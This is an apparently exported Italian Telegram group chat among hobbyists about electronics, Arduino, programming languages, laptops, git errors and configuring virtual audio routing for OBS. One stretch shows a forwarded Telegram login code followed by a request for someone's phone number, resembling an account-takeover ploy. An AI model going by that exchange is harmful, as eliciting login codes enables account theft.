Ma quando accendo non parte la chiavetta
Non usare Unetbootin
Non funziona
Su PC con già Linux Rufus non va
ISO di Windows o altro?
Devo creare la chiavetta con Ubuntu, ma sto già su elementary os
Usa dd
Cos'è?
Un comando di Linux
Serve per creare la chiavetta?
Fa tantissime altre cose
Ma puoi anche creare una chiavetta avviabile
Dd bs= devo mettere la versione di Ubuntu che devo mettere giusto?
Non va
Risolto
 dove sdx è la chiavetta
Ho un servo motore ... qualcuno ha qualche idea con Arduino per farlo rallentare quando è vicino a l'angolo che deve raggiungere? cioè voglio che la velocità di movimento rallenta fino a fermarsi dolcemente...
una specie di PID...
Non mi sembra che si possa fare.
Magari prova a controllare se ci sono delle librerie o dei tutorial in Internet
Si fare si può ...basta trovare la legge metematica...ora mi è venuto in mente un filtro passa basso...
Ci rendiamo conto... la schiavitù nel 2018
 perché
Se c'era la schiavitù avevo già finito...
Sapete se la Canon mg2250 stampa su fogli di dimensione d4 con grammatura di 220g/m²?
Lol
Oh ragazzi tra 6h c’è il pump’N’pump!!11!11!!!1
Che cazzoni che sono
Non ho idea penso che tu possa fare un loop che diminuisce il delay fra un movimento e l'altro
Ignorance + pc = lamer
Ignorance is the / of all evil
AHAHAHAHAHAAH
*facepalm*
Ragazzi scusate 
Qualcuno sa che core monta?
Non sono esperto quindi se è palese non non denigratemi
Grazie
OPS
Questo insomma
È un intel atom
Se è quello da 130 euro... Non aspettarti di più rispetto a un tablet
Ahahaha no no
Ma stavo solo osservando
Che su ram e gpu è molto peggio d’un i5
È un processore low cost e a basso consumo energetico
Si
Per i pc super economici tipo questo da 130€
Lo montano anche su pc più costosi
Cioè, per 130 ci sta
Qualcuno di voi ha un dso150?
Perché?
Secondo voi questo è buono?
E questo che core monta?
Sempre lo stesso
È lo Z8350
Ah si 
Cherry trail
Per guadagnarci ahah
Ahahaha
Dso150 no ma un altro dso si
Perché la gente normale sente "quad core" e pensa di avere un i7 7700k
Ahahahaha
Si ma se monti anche 100 core che insieme non reggono paint, non ti fai mica il super computer tipo Google 
E pensa di avere un quad🤔
Sattoh
LA TERRA È SFERICA E LA SCIENZA LO DIMOSTRA.
USCITE IL LINK
Ban please
USCITE IL LINK
basta
Filippo so che hai il link
il gruppo è privato
e non lo manderei in ogni caso
Il 138?
Si
Come ti trovi? Funziona bene per piccole cose?
Bha... Se vai su di frequenza impazzisce
Se te ne serve uno portatile punterei su uno tipo ds211
O se hai un portatile un hantek di quelli portatili... Io sono passato a quello
Vabbè si, ma per quel che costa
Tipo per usarlo con Arduino o per piccoli lavori
Fino a che non sali di frequenza per hobby piccoli si
Fino a che frequenza segna bene?
Il condizionatore dei poveri
Lì fa così caldo? Qui quasi piove
20.9 celsius
Io sono già andato a mare 4 volte
Io manco una 
Cazzo mi si sta scaricando l’anemometro
Ma è ghiaccio quello?
Si
Non ricordo
 oggi per caso durante la live ti andrebbe di parlare brevemente della tua università? Mi sto avvicinando alla fine del liceo e sono molto indeciso sulla scelta, quindi sarebbe molto interessante sapere cosa fate a ingegneria meccatronica 
Era una proposta e se hai tempo di parlarne mi farebbe molto piacere 
Va bene, ricordamelo in chat dopo
Grazie mille Marco!! 
Certo
Tu fai meccatronica?
Ingegneria industriale
Raga, mi servirebbe un pc portatile per programmare, avete qualcosa da consigliarmi?
Budget 500€
Che caratteristiche deve avere in particolare?
8GB ram e 1TB storage
Principalmente dovrebbe far girare visual studio
Dovresti metterlo nella bio ahaha
Bassino come budget
Bah
Povero cristiano deve ripeterlo 10 mila volte
Basta lasciare l'università 
io ho 500gb di SSD (l'860evo) e 500 di hdd
In effetti ahaha
Odio profondo verso gli ingegneri
Tanto, per quel che fanno
Fanno cadere solo ponti e esplodere centrali nucleari
AHAHAAHAHHAHAHA
Tanto amore eh a tutti gli ingegneri ❤️
inge N ieri
Come Cristo di smonta?
Anche quello non sarebbe male
Come fai con 1TB?
Sono pochissimi
Lo userei come computer seconsario per la scuola
Magari senza devastarlo
Il fisso ce l'ho
500 euro non so quanta potenza hai
Ma non molta
Cos'è, la sagra dei droni, sto finesettimana?
Se mi spieghi come smontarlo non lo devasto
SAGRA DEI DRONI
Non so cosa sia ahaha
Trasformatore
Sincaso i programmi pesanti li uso sul fisso
Visual Studio rientra nei programmi pesanti
Mi sa che va devastato
nuovo o usato
Chi prende i portatili usati?
Chissà cosa ci fa una persona col portatile
Il mio compagno di classe fli lagga visual studio con 8GB ram e pentium
cosa ci farà mai
Nuovo ovviamente
effettivamente voglio comprare un altro hdd da 1 TB
Altrimenti ti trovi i peggio virus o porno
Infatti visual studio pesa tanto
Lamentati dei porno
Pero dei virus si
mai sentito parlare di formattare gli hdd
Io pensavo ad un portatile con un i3
Un portatile è personale, la gente ci si sega col portatile, chissà in quali momenti della giornata lo usa. A me farebbe abbastanza schifo compare un computer usato
Immagina se ti trovi dei libri di un ingegnere
con 500 riesci a prendere anche un i5
Si ma non mi fido molto dei portatili usati
Pero gli manca qualcosa
Ehm... Basta non sporcare in giro, a me farebbe schifo usare il MIO portatile sporco
ma che
A parte i porno, rimane comunque usato da una persona
"La mucca fa Muuu"
Visual Studio mi avvisa che il file potrebbe includere contenuti dannosi... Ma il file l'ho fatto io!
eh sei tu dannoso 
Bam
Non se tutti i file vengono sovrascritti
Non parlo dei files, ma del computer stesso. Metti che uno lo usa ogni sera per segarsi
A me farebbe schifo sinceramente
ma che
Tanto vale comprarlo nuovo
Anche a me succede sul pc della scuola, ma non ci faccio caso e clicco OK
in che linguaggio lo stai programmando?
Io so solo il 
Mi sa che è arrivata l’ora di aggiornarsi 
direi

ee gienta, ce l'ho fatta, ho pulito la tastiera, tasto per tasto, 2 fottutissime ore a acuqa, carta e alcool, bella
C’è Java che è così bello e cross platform
java 🤔
sarebbe una buona idea soprattutto per il cross platform
Oppure C++, C
poi non lo so... bisogna vedere qualcosa di abbastanza simile al 
che non sia radicalmente diverso
C#.NET Core 2.0
ah ok. Io come ho accennato prima sono fermo al 
. Me lo consiglieresti?
e anche se in realtà sta per uscire il 2.2, sono fermo al 2.0 per motivi di compatibilità, che già è compatibile con pochissima roba il 2.0 visto che è un framework uscito da meno di un anno.
sono due sintassi diverse
il VB è compatibile con tutti i framework .NET per i quali è compatibile il C# (.NET Framework 4.7, .NET Core, .NET UWP (quello che funziona solo per Windows 10 desktop, phone e IoT), .NET Standard (ovvero solo le librerie in comune tra tutti i framework))
quindi le librerie sono uguali
oook
ci devo pensare...
cambia solo la sintassi
che diventa c-like, per il resto è uguale, quindi lo impareresti in poco tempo
ah ho capito simile a quella di arduino (esempio stupido)
Ma nooooo
anche
comunque eccoti un esempio:

 sintassi C#

 sintassi VB
Entrambi usano le librerie .NET Core 2.0 e le librerie di Switchando
Ma usa Java
bannettino?
Che funziona pure su Oracle
C# è di Microsoft, non c’è da fidarsi a prescindere
avrei 200 mila motivi per preferire il C# al Java
Tipo?
e qual'è il problema che è di Microsoft? Che il .NET Framework è closed source?
ma io sto usando il .NET Core che è open
Anche, non uso nulla che sia Microsoft
che OS usi?
Gentoo Linux
Anche se mi sto spostando a Linux From Scratch
mhh, da quale cominciare... Le prestazioni? La sicurezza? Le librerie?
Java è portabile, un programma puoi ottimizzarlo, ma non renderlo portabile se fatto su .NET. La sicurezza boh, spiegati meglio. Le librerie, di solito ne scrivo di mie, non amo affidarmi a roba esterna
con portabile intendi multipiattaforma?
Yes
Lo stesso programma funziona ovunque, e non venirmi a parlare di Mono o Wine
Bene, il .NET Core è compatibile con Windows, MAC e Linux con architettura x86/64 e ARMv7 e superiori
nativamente, senza mono.
Appunto, solo Windows Mac e Linux
Java esporti un .jar, lo dai ovunque e funziona sempre
e ti lamenti? Quanta gente al mondo usa Unix, BSD, ecc?
.NET Core esporti un .dll, su qualsiasi piattaforma supportata funziona ed è molto più performante del Java
Tanta gente, sui server... in contesti aziendali BSD è ottimo per via della sua licenza
Non penso che qualcuno userà mai BSD su un Raspberry che usa per l'IoT
lol
Cosa c’entra l’IoT?
che il mio programma è per l'IoT
ed è pensato per girare sui Raspberry
Che programma?
anche se può tranquillamente girare su Windows e MAC rinunciando ad alcune features
quello in C#
Boh non capisco di che programma parli
Switchando, quello che mi stai criticando tanto perché è fatto in .NET
Guarda il nome :/
Non sto criticando Switchando che tra l’altro è la prima volta che lo sento, sto criticando C#, .net e robe simili
ragazzi ma string non funziona nei classi o cosa? riesco a usare la libreria <string> ma non riesco ad usarlo nei classi,da sempre dei errori...
parlo di c++
std::string
OHH grazie,i 24 errori ora sono 2 
non va using namespace std?
ah si,lo ho capito ora. quando ho scritto std,poi ho capito che posso fare solo using namespace std XD
Meglio non usarlo
why?
perche??
Lo dicono tutti i libri migliori di C++, potrebbero esserci funzioni con lo stesso nome
ahh
lol
Sempre meglio fare std::cout e tutte le altre cose
servono nervi eh,ma se faccio un mio namespace con i std:: che mi servono?
?
 che cosa familiare 
esempio
namespace nome{
std::cout;
std::cin;
std:: ecc;
}
cosi non uso ne using std ne std:: no? credo,forse sbaglio
Non ti so dire visto che non uso C++
ahh
Comunque ho capito quello che vuoi dire
okay
 invece lui mi sembra uno sketch di arduino 
niente raga sono fatto per la sintassi del VB

Java e C# hanno la sintassi uguale
uhhhh finalmente il codice non ha dei errori di sintasi,ma cmq dei errori ci sono e sono stanco per corregerli
ma.. se ci sono sia dei pointer sia dei variabili normali nella lista degli parametri del funzione devo usare l'operatore "." o l'operatore "->"?
spero che mi sono fatto capire
Java masterrace
eh niente queste so le cagate che faccio esempio sto coso per eseguire comandi da remoto (trollare la gente)
ma non è criptato
una bella cifratura asimmetrica end-to-end ci stava
eh ma non ho la minima idea di come fare in 
come in un qualsiasi linguaggio
e poi parlo io che Switchando non è criptato, lo sarà solo Switchando Cloud con l'SSL/TLS
questo riesco a fare con le mie piccole capacità da autodidatta ahahahahahah
Ahahahahahahah
so biutiful!
Che ricordi, i form di C#
poi... Se proprio vogliamo trovarci tutti i difetti, così non sei mai sicuro che il messaggio arrivi a destinazione
è gia troppo che funziona lol
ok che dovrebbe sempre arrivare... Ma ci potrebbe stare quella volta su milioni che il pacchetto si perda
Linea di Comando++
ahahahah
io faccio sempre così perché mi scoccio a fare le UI
Quoto
ma qualsiasi tipo di UI, anche quella di Switchando
Io uso SceneBuilder
il pacchetto della sub SendAnswer()?
ti faccio un esempio: hai tuo fratello nell'altra stanza, lo chiami ma non è detto che ti senta per tanti motivi
ah capit
però me ne accorgo perchè non avendomi sentito non può risponedrmi
appunto
nel mio caso non è un problema perchè non serve a nulla di importante
però per cose serie tipo switchando è un problema
perchè potresti potenzialmente avere un'intera casa attaccata
avevo fatto quest'immagine per spiegare le differenze tra il vecchio e il nuovo protocollo di Switchando
in entrambi i casi il client invia un messaggio al server, il primo è come il tuo, il secondo si accerta che il messaggio venga ricevuto, e soprattutto che venga ricevuto una sola volta
ma nemmeno tanto in realtà, al massimo non si spegne la luce, rimandi il comando di nuovo e si spegne
Switchando cloud che ha di diverso da switchando?
È sempre Switchando
È la piattaforma che crea un tunnel fra i server di Switchando e il tuo Raspberry per controllarlo fuori casa
Gratis?
Attraverso un Long Polling HTTPS
Ancora non si sa
Ma è  VB?
No, non sono io
Molto divertente...

Ma dimmi come aggiungere i numeri delle righee,non ho trovato negli impostazioni
Ciao ragazzi  
Vorrei chiedere un consiglio, 


ho un impianto che manda via seriale TTL a 5V una stringa di dati separati da punto virgola

Questi dati una volta salvati su ad dovrei inviarli ad una distanza di una decina di metri ad un dispositivo che possa mostrarli.

La mia domanda sorge a questo punto ...
Come posso inviare i dati? 
Avevo pensato di usare i moduli 433 mhz ma leggendo in Internet ho visto che non riescono a garantire una connessione stabile.

Come seconda possibilità un server Wi-Fi che tramite una pagina html mostri i dati. 

Grazie per la disponibilità
aallora, prima di tutto, cosa usi? arduino, rasp, altre schede, cosa usi?
Avevo un po’ di dubbi anche su quello 
Sarei orientato verso Raspberry
Io ti farei fare un server web che mostra i dati
ma del tipo che da una parte trasmetti con rasp e dall'altra ricevi sempre con rasp?
Si con un monitor piccolino 

ma comunque non dovrebbero esserci problemi essendo una pagina web giusto? 
Potrei avere anche un cellulare
beh se hai la possibilità di metterci un modem di mezzo e connetterli a internet allora vacci di sito internet
ci sono anche alternative, tipo trasmettere direttamente con il rasp(che con un'antennino decente tiene fino a una ventina di metri senza problemi) ma se puoi usa internet che esce più pulita come cosa
Si sì omissione mia 
Metto un modem
e allora sei apposto, fai con una pagina internet facile
Alla fine comunque starei sempre in Lan
sisi, appunto, velocità non centra, anzi, se fossero lavori di precisione(come con i comandi di un drone) direi di andarci di trasmissione radio visto che è diretta, non c'è di mezzo un modem o altro e le onde vanno alla velocità della luce quindi. Però ti serve 1 antenna da una parte e un ricevitore fm dall'altra, facendo via internet non ti serve nulla se non un modem, è meglio così in sti casi
ecc, quindi tranqui e fallo con internet
NO I MACBOOK NON HANNO ALTERNATIVE


 ‎€6‎08‎.1‎3 ‎in‎ve‎ce‎ c‎he‎ €‎81‎1.‎84
⚖️‎ R‎is‎pa‎rm‎i ‎il‎ 2‎5.‎09%
⭐️‎ 4‎.8‎8 ‌‎/‌‎ ‎5.‎00

✂ Coupon: 


- Intel Core i5 7200U di settima generazione ⚡️
- 8GB di RAM DDR4
- 256GB di SSD 
- GPU Nvidia GeForce MX150
- OS Windows 10
- No dogana con la spedizione Italy Express Priority Line 

 

Evoco 
 che ha il Mi Book
 ti auguro che esploda
Solo mostrare i dati 

Mi sa che è la soluzione migliore
E avrei possibilità di espandere la rete con un secondo rasPi che faccia altre cose
websockets
who knows
penso di sì comunque
anche perché lo rilascerò come closed source, così se non vi fidate dei miei server potete hostarlo su un server vostro a cui noi del team non abbiamo accesso
??
Di cosa si parlava?
del fatto che il mi book è una buona alternativa al macbook
❤️
In rapporto al prezzo sicuramente
Mi ci trovo bene
È  la mia destinazione su sto mondo,il mio senso di vita
Learning programming to..



by 
Your login code: 15631

This code can be used to log in to your Telegram account. We never ask it for anything else. Do not give it to anyone, even if they say they're from Telegram!!

If you didn't request this code by trying to log in on another device, simply ignore this message.
Qual'è il tuo numero di telefono?
Non te lo dico
Perché? Qual'è il problema?
vabb, scontato, alle 21:00, quando la gente non ha altro da fare che programmare mettendoti in playback ù-ù


Alle 21:00 – 12
 92%

Alle 19:00 – 1
 8%

 13 people voted so far.
*me
Ok te lo dico
Yeee
Inizia con lo 0 vero?
Inizia con +1
0666
+1 779 ....
Allora sarà qualcuno che non avrà capito che il tuo VoIP è occupato
Non è un VoIP
Raga domanda
Allora strano
Sono gli akkezz
L’ho forwardato io il messaggio
Ho un dongle wifi e vorrei utilizzarlo per la mia tv LG che non ha la scheda WiFi, ovviamente non la riconosce perché non hai driver giusti...posso fare qualcosa per farsi che venga riconosciuta?
ethernet?
Too distant
e da òo esco con il cavo
e
vai alla tv
Magekaz


Coffee.
Io ne riesco a scrivere massimo 30K al mese 
Ma..ma..ma..lol a chi servono 200k? Cosa impari oltre alla sofferenza? XD
Aproposito quanti linguaggi sai?
Per ora uso solo Java, ma ho 16 anni xD
Meglio c++ no?
Per quello che faccio preferisco Java, poi mi viene richiesto quello
Okay
Io studio c++ ,sono 2-3 giorni che ho imparato i classi..
Ma io soffro quando vedo i codici delle persone nel internet tanti non sanno fare un kaz ma postano i loro codici ..
Esatto
Poi c’è il rischio che la gente impari male
Eh sì. Poi ho fatto il facepalm quando uno usava un coso del anno 2011 per scrivere il codice... nel 2015 quando esisteva già il visual studio
Io ho imparato di non guardare nessun'altro codice trane il mio
ehi ragazzi, che telefono mi consigliate sui 200 euro?
iPhone X a rate
genio 
Samsung Galaxy A3? maybe
ma mi servono entrambi i reni
Trova uno Xiaomi su Amazon 
Le rate manco morto per uno smartphone :D
per il primo mese hai i soldi, poi beh..saaad
Xiaomi Mi6 X, o Xiaomi Redmi Note 5 Pro o lo Xiaomi Mi note 3, che al momento è in sconto da 370€ a 260€ 

 tu che dici?
uno xiaomi?
ok
ma non è da comprare ora
verso fine mese
Ha senso comprare uno Xiaomi mi A1 adesso? Perché so che sta per arrivare il prossimo...
ma sbaglio o ha problemi con la banda 20?
No ce l'ha
ah, ok
tutti li xiaomi?
Ci sono varie versioni sia senza che con, bisogna stare attenti al momento dell'acquisto
ok
dell oukitel k6000 plus cosa ne pensate?
Quoto
Ma neanche per un PC
Il PC puoi prenderlo indirettamente a rate :)
Ehy raga posso chiedervi dei consigli su una configurazione per un PC?
se vuoi ti passo la mia
700 euro
wooow
HAHAHAHAHAHAHAHA
io sto a un McDonald dove non prende un cax
gg
Hey gente
Come state?
c'è puzza di scorreggia :I
fratello
SONO NELLA LIVE
DI OVERVOLT!!!!!!!!!
seee
nokia 8 ora ho calcolato ed e fintroppo costoso per 200 euro lol
marco
marco
c'è un problem
serio
a me non piacciono i Windows phine
nokia8 e windows? nokia8 non so ma nokia6 e android 7 ed e figo
cos succed amic mi
i nokia non erano Windows phone?
non zo,ma so che la sistema operativa di nokia 6 e android
chiedo scuse se ho detto qualcosa di ignorante
mhh...
Prima, ora sono con Android
ho cercato su internet
dice android
ma nokia non è più di Microsoft?
No è sempre Microsoft, semplicemente hanno abbandonato Windows mobile nei telefoni nuovi
ah, ok
dove cazzo è trump con le medaglie
raga dato che 
 non mi risponde più in live le magliette overvolt sono solo per i patreon o le possiamo prendere tutti?
ma ce odore di rassismo,come solo per i patreon (anche se io non comprero )
Tutti tutti
*Portafoglio aperto*

non vedo l'ora

Tutti
Su tubeshop

Ciao a tutti i nuovi arrivati !!
Ciao
guardate, ho comprato un pulisci PC professionale ideale per mobo e gpu
Professional 
Problem solving: come faccio a caricare il telefono e usare quella lampada dal comodino, usando quella presa (sulla sinistra) senza fili a penzoloni che rompano?
MA
Sapete se esistano prolunghe "piatte" da incollare al muro per fargli fare il giro?
lol
Apposto, non è per niente buggato youtube
nono assolutamente, é passato un mese
c'é stato un varco spaziotemporale
Cioè dopodomani si riuniscono gli sviluppatori di Google e non ci hanno invitato???? Che cafoni!
 
Fillippo a te hanno detto qualcosa ?
C'è qualcuno che è aggiornato sul prezzo dei componenti del pc?
Sono ancora alti o sono nella norma?
Potresti usare ina prolunga normale e il cavo lo attacchi al muro con delle piastrine adesive o se riesci lo fsi passare nel battiscopa, se è cavo e rimovibile
Che componenti ti servono? In generale sembrano nella norma
A me hanno detto che se voglio andare devo pagare più di quello che un comune mortale immagina
Sono cattivi quelli di Google
Tutti quelli per fare un fisso
Attacchiamo i loro server!!!
Così la prossima volta ci invitano
nope
Ok... Dovresti trovare prezzi normali... Io fossi in te aspetterei settembre per via dei saldi... Ma è un tantino in la
...Minchia Giulio stai scrivendo i promessi sposi ?
È mezz'ora che dgt
Io un fisso ce l'ho gia ma ha 6 anni ma gira ancora benino e stavo guardando per prendermi un portatile per scuola (usandolo come secondario) per programmare ma dovrei spenderci 500€ per un buon pc, ma visto che i prezzi non sono così alti magari un 500€ in più e prendere un fisso cosi ci posso anche giocare
Che faccio?
Di dove sei Giulio?
Quasi
Trento
Portatile usato ?
Nuovo
Ma se ti serve per scuola... Anche un buon usato va bene
E magari ci giochi anche
Però adesso che mi avete detto che i prezzi sono normali potrei cambiare direttamente il fisso tanto il portatile lo userei come secondario
Se cambi solo il fisso non avrai il portatile
Gia
Pero se prendo il portatile comunque prima o poi dovrò cambiare il fisso
Tanto il fisso lo devi cambiare... Tanto vale che ti prendi un portatile (magari usato... Visto il budget ristretto)
Così nel frattempo che arrivi a settembre è pezzo a pezzo ti fai il super PC
Almeno riesci ad avere entrambe le cose
Pero adesso che la scuola è finita non vedrei l'utilizzo quindi lo prenderei a settembre o al black friday di novembre
6x o redmi note 5 pro
Solo a me fanno paura le loro facce?
Nope..
Anch’io sono seduto con quella postura sulla sedia
canaline?
Si su Banggood
Buchi
thx
siamo in 2
ma all'inizio mi era sembrata una fabbrica illegale con lavoratori minorenni sottopagati 🤔
come fai ad avere il tema dark???
ma sull'app c'è?
Non credo
C'è da eoni a questa parte
Sono nella norma. Le gpu stanno calando, le ram sempre alte.
Me ne faro una ragione

Ciao a tutti
Buongiorno
Ciao benvenuto!
Secondo voi il notebook EZbook 3 Pro è  sufficiente per usare CodeBlock e Arduino IDE? O per compilare i programmi è richiesto un processore che deve rispondere a determinate caratteristiche?
Grazie 
mi è comparso quell coso ma non so cosa sia, se lo apro mi apre quella alla ma rimane grigia
È l'easter egg di nougat
Per acchiappare centinaia di migliaia di gattini diversi
So süß
Cosa?
I gattini
ma cosa ca
come funziona?
Premi sopra, si apre una finestrella con la pappa da mettere per acchiappare i micetti
e poi?
E poi aspetti che abbocchino 
la migliore soluzione è usare una canalina bianca con degli angolari e dell'ottimo biadesivo a tenuta forte (il migliore in assoluto è il Tesa, quello usato per gli specchi)
Ma 
 ce la farà a fare la live della live con quel computer la?
E con cicca che rompe le palle
Che non vuole la live della live 

Commentatela 
Che sapete voi, i pannelli fotovoltaici per produrre energia elettrica usano l'effetto fotovoltaico, l'effetto fotoelettrico o sono la stessa cosa?
Ehm
Sul mio libro dice una cosa, su internet ne dice un altra
Fotovoltaico e pannelli solari sono cose diverse. Questo è quello che so io 
Pannelli fotovoltaici*
Sicuramente è vero quello che dice internet

Il 90% del libri sono scritti da incompetenti
Non capisco se prenderla come una battuta o meno -.-
effetto fotovoltaico, chiamato anche effetto Becquerel
Non è una battuta
Quindi l'effetto fotoelettrico non c'entra niente?
Basta leggere i libri di informatica e elettronica per mettersi le mani nei capelli
Ok
l'effetto fotoelettrico è il fenomeno fisico caratterizzato dall'emissione di elettroni da una superficie, solitamente metallica, quando questa viene colpita da una radiazione elettromagnetica oppure da fotoni
mentre l'effetto fotovoltaico è il fenomeno fisico che si realizza quando un elettrone presente nella banda di valenza di un materiale (generalmente semiconduttore) passa alla banda di conduzione a causa dell'assorbimento di un fotone sufficientemente energetico incidente sul materiale.
è l'effetto che sfruttano le celle fotovoltaiche per produrre energia elettrica
sfruttano il comportamento del silicio in baso al tipo di drogaggio (NPN e PNP)
detto questo, che libro avete a scuola? Hoepli? Zanichelli?
TecnoMedia PLUS, di Lattes
fa cagare..te lo mando io un libro buono
Si ma non posso dire al prof "Ora cambio libro, il nostro fa schifo" 
Può essere che il libro è vecchio?
no, però puoi controllare anche altri libri quando hai un dubbio..è il metodo universitario
C’era un libro di scienze che diceva che gli astronauti della stazione internazionale fluttuavano per l’assenza di gravità
Ho solo quello 
ti sto mandando i 2 migliori libri di elettronica in assoluto..il Sedra-Smith e il Malatesta
devo avere anche il Perfetti, ma lo devo cercare
Il mio libro è dello stesso autore
Grazie, se sono su MakerBooks posso anche prenderli da li
No, è proprio una merda
codebase in my company be like



by 
Grazie
Per ora mi si è scaricato solo questo, già mi piace dall'indice 
2 euro
sono libri dell'ITIS e di Ingegneria, è normale
si ci dovrebbero essere..sto caricando anche il Renzo Perfetti su Makerbooks
Ok, grazie di tutto
figurati
Sì puo vedere la Mediaset dalla ps4?
E' piccolo al tatto e ha 2 tasti laterali che non ho capito a che servono
Pagina su - Pagina giù
Andare avanti e dietro tra l directory, pagine etc...
Ah ok grazie
Ho un altra domanda, c'è scritto che l'effetto fotovoltaico è una sottocategoria dell'effetto fotoelettrico, forse si riferiva a quello il mio libro?
si, perchè dipendono entrambi dalla radiazione elettromagnetica
comunque se guardi su un buon libro di fisica oppure elettronica c'è sicuramente
sui miei c'è al 100%
Scusate ma se io metto un piccolo pannello fotovoltaico quello che si trova nei giochi di elettronica posso collegarlo a un robot fato con Arduino
La domanda è riscirebbe a farlo partire Arduino e i due motori
Devi sapere quanta energia dà
Ok ci guardo e prima di stasera ce lo dico se è andato a buon fine
non penso proprio comunque prova
i motori di sicuro no
Arduino magari...
Con audacity posso togliere le interferenze di sottofondo?
Non in maniera perfetta ma si
In che modo?
Non ricordo, ma basta che cerchi su internet, ci sono un sacco di guide anche in italiano
libri di Nuova Elettronica..praticamente la Bibbia del settore :)
li sta caricando, ma ci vorrà un pò 
 eri tu che volevi diventare un typer del blog?

Vi vuole sostituire tutti 
chi di voi è bravo a fare lo "youtuber"?
ho un problema in audio mixing
su che programma?
no é che é successa una cosa bellissima
sul pc mentre gioco utilizzo il gioco e discord, ora vorrei escludere discord e vorrei registrare solo il gioco
sto usando obs e sto provando voice meeter
Eccomi
nessuno può scrivere, siamo tutti impegnatissimi  in 5 minuti gli abbiamo tirato pacco in tre
modestia
Mi puoi aiutare se ti và?
COS
Appunto
Non sto capenzo
Io non ho problemi perchè uso un mixer e un pc separto per discord/ts
ti mando gli screen di là, faccio prima
devo usare una vm o il cellulare uffa
Mair avuto a che fare con situazioni del genere purtroppo 
Roncoli
eppure su obs dovrebbe dare i due controlli separati
prende l'audio diretto di tutto il pc
ma winzozz mixa tutto nello Stereo MIx
Capisco...
altrimenti devo farmi 2 schede audio virtuali
una per il gioco e una master
Tutto l'output di tutte le app va a finire nello stereo mix
eh ecco
buona idea
potresti darmi una mano?
devo vedere
anni fa conoscevo un software del genere
Per l’arcade machine ti consiglio questo usb adapter perchè costa pochissimo. Mi è arrivato oggi e l’ho aperto per vedere se era possibile inserirlo nell’arcade machine facendo dei semplici buchi
I driver sono realtek giusto?
 guarda ^
yes
Ah come al solito
giustamente realtek e windows
mi pare che i driver realtek sono di windows proprio
ma non c'entra nulla
ho cercato e il programma per fare una roba del genere dovrebbe essere virtual audio cable
faccio una scheda audio e ci metto solo il gioco
e quella scheda audio la mando in obs
eh bravo
il problema è come impostarla nel gioco
ah non puoi farlo?
quindi di default metto le casse normali quindi nessuno comunica su voicemeeter
no, nelle impostazioni non c'è
azzo
bel problema
ma tu che cosa devi fare?
voicemeeter lagga 1/10 di secondo
USB adapter? Come mais?
video su YT?
Streaming?
Da maschio a 4 femmine
registrare video/audio di ets2 escludendo discord e company
video su yt
ah ok
anche perchè nel mp se qualcuno rompe le palle ho il video
infatti in ets2 mp in molti registrano
ma che gioco è?
Euro Truck Simulator 2
Multiplayer
Ah ok
ecco perchè in ambito audio preferisco mac
su google non c'è nulla di euro truck, altrimenti devo impostare per predefinito voice meeter e far funzionare solo ets2
ma si deve sentire pure la tua voce?
no
solo il gioco e basta
aaah ok
molto più semplice
come faccio?
su obs ci dovrebbe essere l'impostazione di catturare in modo diretto il gioco senza passare per lo stereo mix
però lo posso ascoltare il gioco?
sisi
anche loro fan cosi
su obs non c'è la funzione, o almeno non la trovo
sto un secondo leggendo l'articolo
disinstalla voicemeter
ok scusami
ok
non serve
con virtual audio cable è piu semplice
fatto
controlla che nelle impostazioni non ti appaia piu voicemeter
ancora esce
devi disinstallare i driver di audiometer
così?
si
ok, riavviato ed è scomparso
scarico virtual audio cable?
si
sta facendo
fatto
riavvio intanto
riavviato
ok
piccolo problema che sto riscontrando
la versione di uptodown è un trial che ogni 2 secondi fa un suono che dice trial
l'ho presa dal sito ufficiale
Ok...
Ma mi sa che lo devi levare
Scusa se ti sto a fa perde tempo
mitico
Da programmi e funzionalità va levato
fatto
riavvio vero?
Si
ok
Qualcuno pratico con GIT?
usa questo come setup
lo metto nella cartella?
di cosa?
 sei pratico con git per le remote repository?
di virtual audio cable
aprilo e basta
Dica
Poi apri la cartella di virtual audio cable
Ho una repository su GitHub ma adesso la vorrei aggiornare, nel progetto ho aggiunto una cartella e aggiornato un file .js. Solo che non ho mai usato git e i suoi comandi.
oh shit aspe
mea culpa
mettilo sul desktop
Hai una cartella locale no? Fai git add . * e poi git commit -m "cosa hai fatto" e poi git push origin master


Ma ti consiglio prima di leggerti un po' in giro
anzi
qua sta tutto quello che serve
quando riesci ad installarlo taggami 
git commit -m "Added WebServer and webpage"
On branch master
nothing to commit, working tree clean

git push origin master
To 

 ! [rejected]        master -> master (non-fast-forward)
error: failed to push some refs to '
'
hint: Updates were rejected because the tip of your current branch is behind
hint: its remote counterpart. Integrate the remote changes (e.g.
hint: 'git pull ...') before pushing again.
hint: See the 'Note about fast-forwards' in 'git push —help' for details.
Ragazzi vi prego qualcuno sa risolvere questo esercizio? Tutti i punti in fondo vanno risolti in un unico programma
100pt. Alla casata di chi risponde per primo
fatto
riavvio? spero di no
Ragazzi sto cercando di aiutare una mia amica in difficoltà ma non ne sono in grado
Fai prima git pull origin master
 
$ git pull origin master
From 

 * branch            master     -> FETCH_HEAD
fatal: refusing to merge unrelated histories




no
ora vai nella cartella dello zip x64
ed estrai tutti i 4 files
fatto?
si
ok
vai nella cartella di virtual audio cable
e incolla quei 4 files che ti ho fatto estrarre
ok
^
fatto?
si
ok
ora vai la nel coso dove scegli la sorgente predefinita
ok
riproduzione o registrazione?
riproduzione
fatto
e seleziona line 1
impostato line 1 come predefinita
ok
ora vai in start
start?
dove
vedi se c'è un app chiamata audiorepeater
si
aprila
quello che finisce con ks?
si
ok
ok
fammi fare un secondo screen di come devi settare tutto
ok
^^^^
Perfavoreeeeeee
se nessuno risponde vuol dire che nessuno sà aiutarti

Gia
Scusate
sappiamo che vuoi farti dare il culo grazie a noi
ma non ci và
almeno per me
startalo
figo, ora posso usarlo anche come meter per le traccie 5.1
percaso senti una voce del c@zzo che dice trial?
no
ok
ultima cosa
ora come ci collego il gioco?
Imposta su obs come sorgente la line 1 di virtual audio cable
e su discord speakers realtek
ed è tutto connesso
ok
fai in questo modo quando registri
quindi ets2 gira su un canale diverso e lo sento?
si
ora provo con vlc
però ricorda
aspe aspe
quando stai registrando vai nelle preferenze e imposta line 1 come predefinito aprendo audio repeater
quando non registri setta speakers e chiudi audio repeater
o avrai seri problemi
tutto chiaro?
tipo?
non senti più nulla
se lo imposto su speaker non lo sento
cosa
vlc
le notifiche di telegram obs le prende ma non le sento
aspe non capisco
tu VLC lo usi per simulare il gioco o discord?
il gioco
ah ok
hai aperto audiorepeater?
si
Ah sisi devo prenderlo, ma non uno splitter così, basta un frontalino femmina
screnami i settaggi
strano
sbagliato
scusa
vlc è sulle cuffie
ah
